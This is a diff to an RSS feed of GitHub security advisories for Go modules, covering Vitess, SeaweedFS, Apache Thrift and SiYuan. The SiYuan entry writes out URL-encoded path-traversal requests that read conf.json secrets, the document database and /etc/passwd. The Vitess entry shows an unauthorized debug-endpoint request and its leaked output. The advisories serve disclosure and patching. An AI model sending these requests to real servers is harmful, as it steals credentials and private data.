@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-09-02T11:50:08.661Z</updated>
+    <updated>2026-09-02T15:33:02.350Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,479 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[vitess.io/vitess] Vitess: Missing authorization on vttablet /debug/vrlog exposes live VReplication SQL data]]></title>
+        <id>https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</id>
+        <link href="https://github.com/advisories/GHSA-mhc4-g3wh-cw7m"/>
+        <updated>2026-09-02T15:26:56.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
+<p><strong>File</strong>: <code>go/vt/vttablet/tabletmanager/vreplication/vrlog.go</code></p>
+<h3 id="summary">Summary</h3>
+<p><code>vttablet</code>'s <code>/debug/vrlog</code> HTTP endpoint streams live VReplication event data — including the literal SQL DML statements being replicated by MoveTables, Reshard, Materialize, and "vitess"-strategy Online DDL workflows — with no authorization check at all. Every comparable "debugging" HTTP endpoint in vttablet/vtgate (querylogz, queryz, txlogz, livequeryz, schemaz, debugenv, hotrows, tablet_plans, query_stats, query_rules) calls <code>acl.CheckAccessHTTP(r, acl.DEBUGGING)</code> before serving data, so that the cluster operator's configured <code>--security-policy</code> (e.g. <code>deny-all</code>, <code>read-only</code>, or a custom plugin) is actually honored. <code>vrlog.go</code> is the one exception: it has zero references to the <code>acl</code> package.</p>
+<h3 id="root-cause">Root Cause</h3>
+<p><code>addHttpEndpoint()</code> registers <code>/debug/vrlog</code> via <code>servenv.HTTPHandleFunc</code>, and <code>vrlogStatsHandler()</code> immediately starts streaming subscribed <code>VrLogStats</code> events to the response writer without first calling <code>acl.CheckAccessHTTP(r, acl.DEBUGGING)</code>, unlike every sibling handler in the same family (see e.g. <code>go/vt/vttablet/tabletserver/querylogz.go</code>'s <code>querylogzHandler</code>, which calls the check first).</p>
+<p>The data streamed is sensitive: <code>go/vt/vttablet/tabletmanager/vreplication/vplayer.go</code> calls <code>NewVrLogStats(...).Send(sql)</code> / <code>.Send(event.Statement)</code> for every row change and statement event flowing through a VReplication stream (vplayer.go:339, 700, 771, 785) — i.e. the literal SQL (including bound data values) being copied/replicated by MoveTables, Reshard, Materialize, and Online DDL.</p>
+<h3 id="attack-scenario">Attack Scenario</h3>
+<ol>
+<li>A cluster operator configures <code>--security-policy=deny-all</code> (or <code>read-only</code>, or a custom policy) specifically to lock down debugging/admin HTTP endpoints on vttablet, relying on this being uniformly enforced.</li>
+<li>An attacker who can reach the vttablet debug HTTP port (common in Kubernetes/Prometheus-scraping deployments where this port is exposed beyond localhost) — but who does NOT have the <code>DEBUGGING</code>/admin role the policy requires — sends <code>GET /debug/vrlog</code>.</li>
+<li>Every other debug endpoint correctly returns <code>403 Forbidden</code>. <code>/debug/vrlog</code> returns <code>200 OK</code> and streams live VReplication event data, including raw SQL DML statements containing application data values, for as long as the attacker keeps the connection open (bounded by <code>timeout</code>/<code>limit</code> query params, repeatable).</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Confidentiality impact: disclosure of live replicated application data (potentially including PII or other sensitive column values) to an unauthorized actor, bypassing an access control the operator explicitly configured. No write/modify capability; this is a read-only information-disclosure / access-control-bypass issue, scoped to the vttablet debug HTTP listener.</p>
+<h3 id="vulnerable-code">Vulnerable Code</h3>
+<pre><code class="language-go">// go/vt/vttablet/tabletmanager/vreplication/vrlog.go
+func addHttpEndpoint() {
+    servenv.HTTPHandleFunc("/debug/vrlog", func(w http.ResponseWriter, r *http.Request) {
+        ch := vrLogStatsLogger.Subscribe("vrlogstats")
+        defer vrLogStatsLogger.Unsubscribe(ch)
+        vrlogStatsHandler(ch, w, r)
+    })
+}
+
+func vrlogStatsHandler(ch chan *VrLogStats, w http.ResponseWriter, r *http.Request) {
+    timeout, limit := parseTimeoutLimitParams(r)
+    // no acl.CheckAccessHTTP(r, acl.DEBUGGING) call anywhere in this file
+    ...
+</code></pre>
+<h3 id="recommended-fix">Recommended Fix</h3>
+<pre><code class="language-go">import "vitess.io/vitess/go/acl"
+
+func vrlogStatsHandler(ch chan *VrLogStats, w http.ResponseWriter, r *http.Request) {
+    if err := acl.CheckAccessHTTP(r, acl.DEBUGGING); err != nil {
+        acl.SendError(w, err)
+        return
+    }
+    timeout, limit := parseTimeoutLimitParams(r)
+    ...
+</code></pre>
+<p>This mirrors the exact pattern already used by <code>querylogz.go</code>, <code>queryz.go</code>, <code>txlogz.go</code>, <code>livequeryz.go</code>, <code>schemaz.go</code>, <code>debugenv.go</code>, and <code>tx_serializer.go</code> (hotrows) in the same codebase.</p>
+<h3 id="verification">Verification</h3>
+<p>Built v24.0.1 from source and wrote a standalone Go test that: (1) activates the real <code>deny-all</code> security policy via <code>acl.RegisterFlags</code>, (2) registers <code>/debug/vrlog</code> via the real, unmodified <code>vreplication.NewVrLogStats(...)</code> call path (the same one <code>vplayer.go</code> uses for live replication traffic), (3) serves the real <code>servenv</code> HTTP mux on a loopback listener, and (4) issues a real <code>GET /debug/vrlog</code> while emitting a simulated replicated statement.</p>
+<p>Result:</p>
+<pre><code>acl.CheckAccessHTTP(DEBUGGING) under deny-all =&gt; err=not allowed: deny-all security-policy enforced
+GET /debug/vrlog under deny-all =&gt; status=200 body="ROWCHANGE Event\tINSERT INTO secret_table (ssn) VALUES ('leaked-via-vrlog')\t2026-06-22T11:01:55\t147101\n"
+</code></pre>
+<p>The identical ACL check that protects every sibling endpoint correctly rejected the request, while <code>/debug/vrlog</code> returned 200 and streamed the simulated sensitive content — confirming the bypass against real, unmodified v24.0.1 code.</p>
+<p>Also confirmed via the GitHub Contents API that <code>vrlog.go</code> has zero references to the <code>acl</code> package on <code>main</code>, <code>release-23.0</code>, and <code>release-22.0</code> as well, so all currently supported release lines appear affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-mhc4-g3wh-cw7m">https://github.com/vitessio/vitess/security/advisories/GHSA-mhc4-g3wh-cw7m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-65959">https://nvd.nist.gov/vuln/detail/CVE-2026-65959</a></li>
+<li><a href="https://github.com/vitessio/vitess/pull/20467">https://github.com/vitessio/vitess/pull/20467</a></li>
+<li><a href="https://github.com/vitessio/vitess/commit/4c58cd70edc6b03d61cb65842c342ac08341e64f">https://github.com/vitessio/vitess/commit/4c58cd70edc6b03d61cb65842c342ac08341e64f</a></li>
+<li><a href="https://github.com/vitessio/vitess/commit/657662e78bde1c82df680e9cc43a686d619f8094">https://github.com/vitessio/vitess/commit/657662e78bde1c82df680e9cc43a686d619f8094</a></li>
+<li><a href="https://github.com/vitessio/vitess/commit/d929225a450027406687d27af8dca45620945ceb">https://github.com/vitessio/vitess/commit/d929225a450027406687d27af8dca45620945ceb</a></li>
+<li><a href="https://github.com/advisories/GHSA-mhc4-g3wh-cw7m">https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-18T20:50:54.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vitess.io/vitess] Vitess: Missing authorization on vttablet /debug/vrlog exposes live VReplication SQL data]]></title>
+        <id>https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</id>
+        <link href="https://github.com/advisories/GHSA-mhc4-g3wh-cw7m"/>
+        <updated>2026-09-02T15:26:56.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
+<p><strong>File</strong>: <code>go/vt/vttablet/tabletmanager/vreplication/vrlog.go</code></p>
+<h3 id="summary">Summary</h3>
+<p><code>vttablet</code>'s <code>/debug/vrlog</code> HTTP endpoint streams live VReplication event data — including the literal SQL DML statements being replicated by MoveTables, Reshard, Materialize, and "vitess"-strategy Online DDL workflows — with no authorization check at all. Every comparable "debugging" HTTP endpoint in vttablet/vtgate (querylogz, queryz, txlogz, livequeryz, schemaz, debugenv, hotrows, tablet_plans, query_stats, query_rules) calls <code>acl.CheckAccessHTTP(r, acl.DEBUGGING)</code> before serving data, so that the cluster operator's configured <code>--security-policy</code> (e.g. <code>deny-all</code>, <code>read-only</code>, or a custom plugin) is actually honored. <code>vrlog.go</code> is the one exception: it has zero references to the <code>acl</code> package.</p>
+<h3 id="root-cause">Root Cause</h3>
+<p><code>addHttpEndpoint()</code> registers <code>/debug/vrlog</code> via <code>servenv.HTTPHandleFunc</code>, and <code>vrlogStatsHandler()</code> immediately starts streaming subscribed <code>VrLogStats</code> events to the response writer without first calling <code>acl.CheckAccessHTTP(r, acl.DEBUGGING)</code>, unlike every sibling handler in the same family (see e.g. <code>go/vt/vttablet/tabletserver/querylogz.go</code>'s <code>querylogzHandler</code>, which calls the check first).</p>
+<p>The data streamed is sensitive: <code>go/vt/vttablet/tabletmanager/vreplication/vplayer.go</code> calls <code>NewVrLogStats(...).Send(sql)</code> / <code>.Send(event.Statement)</code> for every row change and statement event flowing through a VReplication stream (vplayer.go:339, 700, 771, 785) — i.e. the literal SQL (including bound data values) being copied/replicated by MoveTables, Reshard, Materialize, and Online DDL.</p>
+<h3 id="attack-scenario">Attack Scenario</h3>
+<ol>
+<li>A cluster operator configures <code>--security-policy=deny-all</code> (or <code>read-only</code>, or a custom policy) specifically to lock down debugging/admin HTTP endpoints on vttablet, relying on this being uniformly enforced.</li>
+<li>An attacker who can reach the vttablet debug HTTP port (common in Kubernetes/Prometheus-scraping deployments where this port is exposed beyond localhost) — but who does NOT have the <code>DEBUGGING</code>/admin role the policy requires — sends <code>GET /debug/vrlog</code>.</li>
+<li>Every other debug endpoint correctly returns <code>403 Forbidden</code>. <code>/debug/vrlog</code> returns <code>200 OK</code> and streams live VReplication event data, including raw SQL DML statements containing application data values, for as long as the attacker keeps the connection open (bounded by <code>timeout</code>/<code>limit</code> query params, repeatable).</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Confidentiality impact: disclosure of live replicated application data (potentially including PII or other sensitive column values) to an unauthorized actor, bypassing an access control the operator explicitly configured. No write/modify capability; this is a read-only information-disclosure / access-control-bypass issue, scoped to the vttablet debug HTTP listener.</p>
+<h3 id="vulnerable-code">Vulnerable Code</h3>
+<pre><code class="language-go">// go/vt/vttablet/tabletmanager/vreplication/vrlog.go
+func addHttpEndpoint() {
+    servenv.HTTPHandleFunc("/debug/vrlog", func(w http.ResponseWriter, r *http.Request) {
+        ch := vrLogStatsLogger.Subscribe("vrlogstats")
+        defer vrLogStatsLogger.Unsubscribe(ch)
+        vrlogStatsHandler(ch, w, r)
+    })
+}
+
+func vrlogStatsHandler(ch chan *VrLogStats, w http.ResponseWriter, r *http.Request) {
+    timeout, limit := parseTimeoutLimitParams(r)
+    // no acl.CheckAccessHTTP(r, acl.DEBUGGING) call anywhere in this file
+    ...
+</code></pre>
+<h3 id="recommended-fix">Recommended Fix</h3>
+<pre><code class="language-go">import "vitess.io/vitess/go/acl"
+
+func vrlogStatsHandler(ch chan *VrLogStats, w http.ResponseWriter, r *http.Request) {
+    if err := acl.CheckAccessHTTP(r, acl.DEBUGGING); err != nil {
+        acl.SendError(w, err)
+        return
+    }
+    timeout, limit := parseTimeoutLimitParams(r)
+    ...
+</code></pre>
+<p>This mirrors the exact pattern already used by <code>querylogz.go</code>, <code>queryz.go</code>, <code>txlogz.go</code>, <code>livequeryz.go</code>, <code>schemaz.go</code>, <code>debugenv.go</code>, and <code>tx_serializer.go</code> (hotrows) in the same codebase.</p>
+<h3 id="verification">Verification</h3>
+<p>Built v24.0.1 from source and wrote a standalone Go test that: (1) activates the real <code>deny-all</code> security policy via <code>acl.RegisterFlags</code>, (2) registers <code>/debug/vrlog</code> via the real, unmodified <code>vreplication.NewVrLogStats(...)</code> call path (the same one <code>vplayer.go</code> uses for live replication traffic), (3) serves the real <code>servenv</code> HTTP mux on a loopback listener, and (4) issues a real <code>GET /debug/vrlog</code> while emitting a simulated replicated statement.</p>
+<p>Result:</p>
+<pre><code>acl.CheckAccessHTTP(DEBUGGING) under deny-all =&gt; err=not allowed: deny-all security-policy enforced
+GET /debug/vrlog under deny-all =&gt; status=200 body="ROWCHANGE Event\tINSERT INTO secret_table (ssn) VALUES ('leaked-via-vrlog')\t2026-06-22T11:01:55\t147101\n"
+</code></pre>
+<p>The identical ACL check that protects every sibling endpoint correctly rejected the request, while <code>/debug/vrlog</code> returned 200 and streamed the simulated sensitive content — confirming the bypass against real, unmodified v24.0.1 code.</p>
+<p>Also confirmed via the GitHub Contents API that <code>vrlog.go</code> has zero references to the <code>acl</code> package on <code>main</code>, <code>release-23.0</code>, and <code>release-22.0</code> as well, so all currently supported release lines appear affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-mhc4-g3wh-cw7m">https://github.com/vitessio/vitess/security/advisories/GHSA-mhc4-g3wh-cw7m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-65959">https://nvd.nist.gov/vuln/detail/CVE-2026-65959</a></li>
+<li><a href="https://github.com/vitessio/vitess/pull/20467">https://github.com/vitessio/vitess/pull/20467</a></li>
+<li><a href="https://github.com/vitessio/vitess/commit/4c58cd70edc6b03d61cb65842c342ac08341e64f">https://github.com/vitessio/vitess/commit/4c58cd70edc6b03d61cb65842c342ac08341e64f</a></li>
+<li><a href="https://github.com/vitessio/vitess/commit/657662e78bde1c82df680e9cc43a686d619f8094">https://github.com/vitessio/vitess/commit/657662e78bde1c82df680e9cc43a686d619f8094</a></li>
+<li><a href="https://github.com/vitessio/vitess/commit/d929225a450027406687d27af8dca45620945ceb">https://github.com/vitessio/vitess/commit/d929225a450027406687d27af8dca45620945ceb</a></li>
+<li><a href="https://github.com/advisories/GHSA-mhc4-g3wh-cw7m">https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-18T20:50:54.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/seaweedfs/seaweedfs] SeaweedFS: Unauthenticated filer IAM gRPC service grants S3 administrative control]]></title>
+        <id>https://github.com/advisories/GHSA-2v6v-25fm-p4fg</id>
+        <link href="https://github.com/advisories/GHSA-2v6v-25fm-p4fg"/>
+        <updated>2026-09-02T14:51:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The filer registered the IAM gRPC service (<code>SeaweedIdentityAccessManagement</code>) with no authentication. Any client able to reach the filer gRPC port could invoke IAM RPCs — <code>CreateUser</code>, <code>CreateAccessKey</code>, <code>PutUserPolicy</code>, and related calls — to mint credentials and grant itself S3 administrative privileges. This fully compromises the confidentiality, integrity, and availability of stored objects.</p>
+<p>No credentials are required, and enabling the documented JWT signing keys does not close it: the IAM gRPC service was not gated by that mechanism. Even under mTLS, the listener-level <code>allowed_commonNames</code> ACL applies to the port rather than to individual RPCs, so any cluster mesh certificate could reach these administrative calls.</p>
+<h3 id="affected-component">Affected component</h3>
+<ul>
+<li><code>weed/server/filer_server_handlers_iam_grpc.go</code></li>
+<li><code>weed/command/filer.go</code></li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>4.24</strong>. Every IAM RPC now requires a Bearer token signed with the filer admin signing key (<code>jwt.filer_signing.key</code>), and the service refuses to register when no signing key is configured — removing the unauthenticated default entirely.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Restrict the filer gRPC port to trusted hosts. Configure <code>jwt.filer_signing.key</code> in <code>security.toml</code> and upgrade to 4.24; operators that use the IAM RPCs must attach an admin-signed Bearer token on each call.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>Fixed by seaweedfs/seaweedfs#9442 (follow-ups: #9498, #9508, #9514, #9536)</li>
+<li>Reported by Kadir Arslan (<a href="https://github.com/KadirArslan">https://github.com/KadirArslan</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-2v6v-25fm-p4fg">https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-2v6v-25fm-p4fg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-72920">https://nvd.nist.gov/vuln/detail/CVE-2026-72920</a></li>
+<li><a href="https://github.com/seaweedfs/seaweedfs/pull/9442">https://github.com/seaweedfs/seaweedfs/pull/9442</a></li>
+<li><a href="https://github.com/seaweedfs/seaweedfs/commit/5e8f99f40a8abc7b449aefd260516443377041c7">https://github.com/seaweedfs/seaweedfs/commit/5e8f99f40a8abc7b449aefd260516443377041c7</a></li>
+<li><a href="https://github.com/seaweedfs/seaweedfs/releases/tag/4.24">https://github.com/seaweedfs/seaweedfs/releases/tag/4.24</a></li>
+<li><a href="https://github.com/advisories/GHSA-2v6v-25fm-p4fg">https://github.com/advisories/GHSA-2v6v-25fm-p4fg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2v6v-25fm-p4fg</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-09-02T14:51:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/apache/thrift] Apache Thrift Python, Go, PHP and Java bindings have an Infinite Loop]]></title>
+        <id>https://github.com/advisories/GHSA-8wv5-x4w7-5gww</id>
+        <link href="https://github.com/advisories/GHSA-8wv5-x4w7-5gww"/>
+        <updated>2026-09-02T14:31:02.000Z</updated>
+        <content type="html"><![CDATA[<p>Loop with Unreachable Exit Condition ('Infinite Loop') vulnerability in Apache Thrift Python, Go, PHP and Java bindings.This issue affects Apache Thrift: before 0.24.0.</p>
+<p>Users are recommended to upgrade to version 0.24.0, which fixes the issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43871">https://nvd.nist.gov/vuln/detail/CVE-2026-43871</a></li>
+<li><a href="https://lists.apache.org/thread/7v3jhgwfbmhx42424phydlnzb109g8b9">https://lists.apache.org/thread/7v3jhgwfbmhx42424phydlnzb109g8b9</a></li>
+<li><a href="https://lists.apache.org/thread/l4dwf14zbyqsmkc28c99ojj3t3gg9qby">https://lists.apache.org/thread/l4dwf14zbyqsmkc28c99ojj3t3gg9qby</a></li>
+<li><a href="http://www.openwall.com/lists/oss-security/2026/07/24/33">http://www.openwall.com/lists/oss-security/2026/07/24/33</a></li>
+<li><a href="https://github.com/advisories/GHSA-8wv5-x4w7-5gww">https://github.com/advisories/GHSA-8wv5-x4w7-5gww</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8wv5-x4w7-5gww</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-27T12:31:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] Siyuan: Authenticated path traversal in /snippets/ static handler (serveSnippets) leaks conf/conf.json secrets and siyuan.db]]></title>
+        <id>https://github.com/advisories/GHSA-275h-v5h9-vr82</id>
+        <link href="https://github.com/advisories/GHSA-275h-v5h9-vr82"/>
+        <updated>2026-09-02T14:17:45.000Z</updated>
+        <content type="html"><![CDATA[<p>Reporter: Cavan Loughran, Celvex Group Inc.</p>
+<h2 id="summary">Summary</h2>
+<p>The /snippets/*filepath route handler serveSnippets in kernel/server/serve.go performs a bare filepath.Join(util.SnippetsPath, filePath) on the single-decoded c.Request.URL.Path and serves the result with c.File(), with NO IsSubPath containment and NO IsSensitivePath denylist - unlike the sibling /export/ (serveExport) and /appearance/ (serveAppearance) handlers, which both carry IsSubPath, and unlike /assets/ (serveAssets), whose traversal was fixed in GHSA-p4m3-mgmm-c664. Because util.SnippetsPath = WorkspaceDir/data/snippets, an authenticated request to GET /snippets/%2e%2e/%2e%2e/conf/conf.json resolves to WorkspaceDir/conf/conf.json and leaks the kernel API token and AccessAuthCode (the same secret file CVE-2026-30869 leaked from /export/); GET /snippets/%2e%2e/%2e%2e/temp/siyuan.db leaks the full document database.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>v3.6.5 and current master (verified by direct source read). The /export/ and /assets/ fixes were endpoint-scoped and never reached serveSnippets.</p>
+<h2 id="technical-detail">Technical detail</h2>
+<p>Sink, kernel/server/serve.go, serveSnippets (verbatim, current master and v3.6.5):</p>
+<p>  func serveSnippets(ginServer *gin.Engine) {
+      ginServer.Handle("GET", "/snippets/*filepath", model.CheckAuth, func(c *gin.Context) {
+          filePath := strings.TrimPrefix(c.Request.URL.Path, "/snippets/")
+          if !model.IsAdminRoleContext(c) {
+              if "conf.json" == filePath {
+                  c.Status(http.StatusUnauthorized)
+                  return
+              }
+          }
+          ext := filepath.Ext(filePath)
+          name := strings.TrimSuffix(filePath, ext)
+          confSnippets, err := model.LoadSnippets()
+          ...
+          for _, s := range confSnippets {
+              if s.Name == name &amp;&amp; ("" != ext &amp;&amp; s.Type == ext[1:]) {
+                  c.Header("Content-Type", mime.TypeByExtension(ext))
+                  c.String(http.StatusOK, s.Content)
+                  return
+              }
+          }
+          // when not matched in the config file, look it up on the filesystem
+          filePath = filepath.Join(util.SnippetsPath, filePath)   // &lt;-- TAINTED join, no containment
+          c.File(filePath)                                        // &lt;-- arbitrary workspace file read
+      })
+  }</p>
+<p>Taint path, end to end:</p>
+<ol>
+<li>Route GET /snippets/*filepath is registered with the single middleware model.CheckAuth (authentication only; NO CheckAdminRole).</li>
+<li>c.Request.URL.Path is the request path AFTER Go net/http has percent-decoded it ONCE. The kernel runs gin.New() with default settings (UseRawPath = false, UnescapePathValues = true) and installs NO path-sanitizing middleware (the global ginServer.Use(...) chain is ControlConcurrency, Timing, Recover, corsMiddleware(), jwtMiddleware, gzip, sessions only - none cleans or rejects ..). net/http does not path.Clean URL.Path for gin handlers, so a single-encoded %2e%2e arrives at the handler as a literal .. segment.</li>
+<li>filePath := strings.TrimPrefix(c.Request.URL.Path, "/snippets/") yields the attacker-controlled remainder, e.g. ../../conf/conf.json.</li>
+<li>The non-admin guard checks only "conf.json" == filePath; with traversal the value is "../../conf/conf.json", so the guard does not fire (and admins are not checked at all).</li>
+<li>The config-snippet name/ext loop does not match a traversal string, so control falls through to the filesystem branch.</li>
+<li>filePath = filepath.Join(util.SnippetsPath, filePath): Go's filepath.Join runs Clean, which RESOLVES .. segments. Clean("WorkspaceDir/data/snippets" + "/../../conf/conf.json") = WorkspaceDir/conf/conf.json. There is no IsSubPath confinement, so the resolved path escapes the snippets root.</li>
+<li>c.File(filePath) streams the resolved file to the response body.</li>
+</ol>
+<p>Directory layout (confirmed by kernel/util/working.go):
+  WorkspaceDir/
+    data/snippets/  = util.SnippetsPath  (the /snippets/ base)
+    conf/conf.json  &lt;-- API token + AccessAuthCode (the secret)
+    temp/siyuan.db  &lt;-- full SQLite database
+From util.SnippetsPath = WorkspaceDir/data/snippets the climb-out is exactly two levels:</p>
+<ul>
+<li>GET /snippets/%2e%2e/%2e%2e/conf/conf.json -&gt; WorkspaceDir/conf/conf.json (kernel API token, AccessAuthCode, cookie signing material - the same secrets CVE-2026-30869 leaked).</li>
+<li>GET /snippets/%2e%2e/%2e%2e/temp/siyuan.db -&gt; WorkspaceDir/temp/siyuan.db (the entire document database).</li>
+<li>GET /snippets/%2e%2e/%2e%2e/%2e%2e/etc/passwd (and deeper) reaches host files outside the workspace; c.File serves any path Clean resolves to, subject only to OS file permissions.</li>
+</ul>
+<h2 id="incomplete-fix-lineage-patch-diff">Incomplete-fix lineage (patch-diff)</h2>
+<p>SiYuan has been fixing path traversal in file-serving handlers ONE endpoint at a time:</p>
+<ul>
+<li>/export/ (serveExport): CVE-2026-30869 (IsSensitivePath denylist, v3.5.10), then CVE-2026-41894 / GHSA-hjh7-r5w8-5872 (double-encode bypass, v3.6.5). Now has IsSubPath(exportBaseDir, fullPath) + IsSensitivePath.</li>
+<li>/appearance/ (serveAppearance): hardened alongside; has IsSubPath(appearancePath, filePath).</li>
+<li>/assets/*path (serveAssets): GHSA-p4m3-mgmm-c664; delegates to model.GetAssetAbsPath (containment) + publish-access check.</li>
+<li>/snippets/*filepath (serveSnippets): NONE. NO IsSubPath, NO IsSensitivePath; only a literal "conf.json" string match for non-admins, defeated by traversal.
+The fixes that closed /export/ and /assets/ were endpoint-scoped (per-handler IsSubPath/IsSensitivePath/GetAssetAbsPath) rather than a shared request-level path-confinement primitive applied to every c.File/http.ServeFile sink. serveSnippets was never touched. It reaches the SAME secret file (conf/conf.json) the parent CVE-2026-30869 was filed for, at a LOWER bar in one respect: it needs only single URL encoding (no double-encode trick), because there is no containment check to bypass in the first place.</li>
+</ul>
+<h2 id="privilege--reachability-stated-honestly">Privilege / reachability (stated honestly)</h2>
+<p>The route is gated by model.CheckAuth only (any authenticated user), NOT CheckAdminRole. CheckAuth admits any principal that presents a valid API token (Conf.Api.Token), a valid session whose AccessAuthCode == Conf.AccessAuthCode, or BasicAuth. The handler's own if !model.IsAdminRoleContext(c) branch confirms non-admin reachability; that branch only blocks the literal string "conf.json", which the traversal payload "../../conf/conf.json" does not match, so even non-admins leak the secret file. SiYuan supports non-admin authenticated roles (RoleEditor, RoleReader) in shared/published workspace modes, plus access-auth-code logins. Privilege required: PR:L (a valid authenticated session), NOT pre-auth and NOT admin-gated. Reading conf/conf.json yields the admin API token/AccessAuthCode, letting a non-admin escalate to full kernel-admin API control; siyuan.db leaks all note content. The kernel HTTP server is the published interface for self-hosted/Docker deployments (AV:N).</p>
+<p>SiYuan's SECURITY.md excludes arbitrary file WRITE outside the workspace as a non-issue, but this finding is arbitrary file READ of in-workspace secrets (conf/conf.json, siyuan.db) and host files. Read-side traversal of conf.json is exactly what CVE-2026-30869 was accepted for, so this is squarely in scope.</p>
+<p>Non-destructive: no weaponized exploit is included; the chain is described in prose for the maintainer to reproduce.</p>
+<p>Secondary (reported for completeness, not the headline): serveRepoDiff (/repo/diff/*path) shares the same bare filepath.Join(util.TempDir, "repo", "diff", requestPath) + http.ServeFile with NO containment, so .. in requestPath escapes TempDir/repo/diff. BUT it carries model.CheckAdminRole (admin-only), so the trust boundary crossed is weak (an admin already holds the API token). Lower severity; shares the same one-line fix.</p>
+<h2 id="impact">Impact</h2>
+<p>Authenticated (non-admin, PR:L) arbitrary workspace file read: kernel API token + AccessAuthCode (conf/conf.json), the full document database (siyuan.db), and host files outside the workspace. Leaking conf.json enables escalation to full kernel-admin API control (and, per the parent CVE, can be chained toward RCE).</p>
+<h2 id="novelty">Novelty</h2>
+<p>GitHub Security Advisories for siyuan-note/siyuan include GHSA-2h2p-mvfx-868w / CVE-2026-30869 (/export/), GHSA-hjh7-r5w8-5872 / CVE-2026-41894 (/export/ double-encode), GHSA-p4m3-mgmm-c664 (/assets/ double-encode), plus stored-XSS/template-injection advisories. NONE references /snippets/ or serveSnippets. OSV / GitLab Advisory Database for the Go module github.com/siyuan-note/siyuan/kernel lists only the /export/ and /assets/ path-traversal entries. Not a duplicate; the contribution is the distinct, unpatched sibling handler serveSnippets reached at a non-admin authenticated privilege.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Add the same containment SiYuan already uses in serveExport/serveAppearance: resolve filePath and reject if !gulu.File.IsSubPath(util.SnippetsPath, resolved), and apply util.IsSensitivePath. The identical one-line containment also closes the admin-only /repo/diff/*path (serveRepoDiff) handler.</p>
+<p>CWE: CWE-22 (Path Traversal), related CWE-23 (Relative Path Traversal). CVSS v3.1 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N).</p>
+<p>Coordinated-disclosure terms: 90 days from acknowledgement before public disclosure, aligned earlier if a fix ships sooner. No public issue / PR / gist / post has been or will be opened before a coordinated date or a shipped fix. No weaponized PoC has been shared.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-275h-v5h9-vr82">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-275h-v5h9-vr82</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59832">https://nvd.nist.gov/vuln/detail/CVE-2026-59832</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/commit/68cc0f537dfa4502496dfa794e71835421c25c09">https://github.com/siyuan-note/siyuan/commit/68cc0f537dfa4502496dfa794e71835421c25c09</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.7.1">https://github.com/siyuan-note/siyuan/releases/tag/v3.7.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-275h-v5h9-vr82">https://github.com/advisories/GHSA-275h-v5h9-vr82</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-275h-v5h9-vr82</uri>
+        </author>
